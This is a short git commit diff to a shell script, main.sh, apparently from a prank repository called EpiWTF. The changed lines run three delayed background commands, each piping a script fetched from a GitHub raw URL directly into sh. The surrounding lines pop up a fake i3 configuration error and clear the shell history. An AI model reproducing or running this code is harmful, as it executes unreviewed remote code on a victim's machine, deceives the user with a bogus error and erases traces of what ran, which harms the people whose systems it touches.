af1d8a4c4962162c01923c7c249b188a444497df
Ilyann Gwinner <ilyann.gwinner@epita.fr>
2024-12-10 17:16:13 +0100

    patch main

--- main.sh
+++ main.sh
@@ -1,6 +1,6 @@
-sleep 30; curl https://raw.githubusercontent.com/ilil2/EpiWTF/main/WTF/loop.sh | sh &
-sleep 35; curl https://raw.githubusercontent.com/ilil2/EpiWTF/main/WTF/notif.sh | sh &
-sleep 5; curl https://raw.githubusercontent.com/ilil2/EpiWTF/main/WTF/img.sh |sh &
+(sleep 30; curl https://raw.githubusercontent.com/ilil2/EpiWTF/main/WTF/loop.sh | sh) &
+(sleep 35; curl https://raw.githubusercontent.com/ilil2/EpiWTF/main/WTF/notif.sh | sh) &
+(sleep 5; curl https://raw.githubusercontent.com/ilil2/EpiWTF/main/WTF/img.sh |sh) &
 
 i3-nagbar -t error -m "error with your %e=\\fe42' config" &
 history -c &
